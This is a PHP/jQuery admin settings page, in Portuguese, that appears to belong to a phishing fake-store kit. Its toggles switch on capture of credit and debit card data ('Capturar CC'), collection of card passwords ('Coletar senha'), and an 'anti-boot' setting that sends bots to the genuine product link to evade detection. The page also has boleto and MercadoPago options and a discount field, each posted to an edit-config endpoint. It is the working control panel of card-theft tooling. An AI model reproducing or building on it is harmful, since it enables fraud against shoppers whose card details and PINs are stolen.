
<div class="row bg-title">
    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
        <h4 class="page-title">Dashboard</h4> </div>
    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
        <ol class="breadcrumb">
            <li><a href="#">Condifurações da tela</a></li>
        </ol>
    </div>
    <!-- /.col-lg-12 -->
</div>
<!-- ============================================================== -->
<!-- table -->
<!-- ============================================================== -->
<div class="row">
    <div class="col-md-12 col-lg-12 col-sm-12">
        <div class="white-box">
            <table class="table">
              <tbody>
                <?php
                $config = query("SELECT * FROM config");
                $row_config = assoc($config);
                ?>
                <tr>
                  <td class="bg-info" style="color: #fff;">Configurações</td>
                </tr>
                <tr>
                  <td>Valor de desconto
                    <button type="button" class="btn btn-primary" id="sd" style="float:right;margin-right:15px;">Atualizar</button>
                    <input type="number" class="form-control" id="desconto" placeholder="De 0 a 100 (Atual: <?php echo $conf['desconto']?>)" style="width:200px;float:right;margin-right:15px;">
                </td>
                </tr>
                <tr>
                  <td>Anti-boot <font style="color:red;font-size:10px;">(Atenção: Quando desativado, o usuário é direcionado para o link do produto original)</font><a id="antiboot" style="float:right;margin-right:15px;" class="btn btn-<?php if($row_config['antiboot']==1){echo "danger";}else{echo "success";}?>"><?php if($row_config['antiboot']==1){echo "Desativar";}else{echo "Ativar";}?></a></td>
                </tr>
                <tr>
                  <td>Capturar CC <a id="cc" style="float:right;margin-right:15px;" class="btn btn-<?php if($row_config['cc']==1){echo "danger";}else{echo "success";}?>"><?php if($row_config['cc']==1){echo "Desativar";}else{echo "Ativar";}?></a></td>
                </tr>
                <tr>
                  <td>Capturar CC Débito <a id="cc_debit" style="float:right;margin-right:15px;" class="btn btn-<?php if($row_config['cc_debit']==1){echo "danger";}else{echo "success";}?>"><?php if($row_config['cc_debit']==1){echo "Desativar";}else{echo "Ativar";}?></a></td>
                </tr>
                <tr>
                  <td>Usar boletos <a id="boleto" style="float:right;margin-right:15px;" class="btn btn-<?php if($row_config['boleto']==1){echo "danger";}else{echo "success";}?>"><?php if($row_config['boleto']==1){echo "Desativar";}else{echo "Ativar";}?></a></td>
                </tr>
                <tr>
                  <td>Usar API MercadoPago<a id="api" style="float:right;margin-right:15px;" class="btn btn-<?php if($row_config['api']==1){echo "danger";}else{echo "success";}?>"><?php if($row_config['api']==1){echo "Desativar";}else{echo "Ativar";}?></a></td>
                </tr>
                <tr>
                  <td>Coletar senha<a id="pass" style="float:right;margin-right:15px;" class="btn btn-<?php if($row_config['senha_cc']==1){echo "danger";}else{echo "success";}?>"><?php if($row_config['senha_cc']==1){echo "Desativar";}else{echo "Ativar";}?></a></td>
                </tr>
                <tr>
                  <td>Usando SSL no Host<a id="ssl" style="float:right;margin-right:15px;" class="btn btn-<?php if($row_config['usando_ssl']==1){echo "danger";}else{echo "success";}?>"><?php if($row_config['usando_ssl']==1){echo "Desativar";}else{echo "Ativar";}?></a></td>
                </tr>
              </tbody>
            </table>
        </div>
    </div>
</div>
<div id="result"></div>
<script>
  $('document').ready(function(){
    $('#cc').click(function(){
        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                cc: <?php echo $row_config['cc'];?>
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });

  $('document').ready(function(){
    $('#cc_debit').click(function(){
        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                cc_debit: <?php echo $row_config['cc_debit'];?>
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });

  $('document').ready(function(){
    $('#boleto').click(function(){
        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                boleto: <?php echo $row_config['boleto'];?>
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });

  $('document').ready(function(){
    $('#api').click(function(){
        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                api: <?php echo $row_config['api'];?>
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });

  $('document').ready(function(){
    $('#ssl').click(function(){
        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                ssl: <?php echo $row_config['usando_ssl'];?>
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });

  $('document').ready(function(){
    $('#pass').click(function(){
        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                senha: <?php echo $row_config['senha_cc'];?>
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });

  $('document').ready(function(){
    $('#antiboot').click(function(){
        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                antiboot: <?php echo $row_config['antiboot'];?>
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });

  $('document').ready(function(){
    $("#sd").click(function(){
        var desconto = $("#desconto").val();

        $.ajax({
            method: "POST",
            url: 'pages/edit-config.php',
            data: {
                desconto: desconto
            }
        }).done(function(result){
            $('#result').html(result);
        });
    });
  });
</script>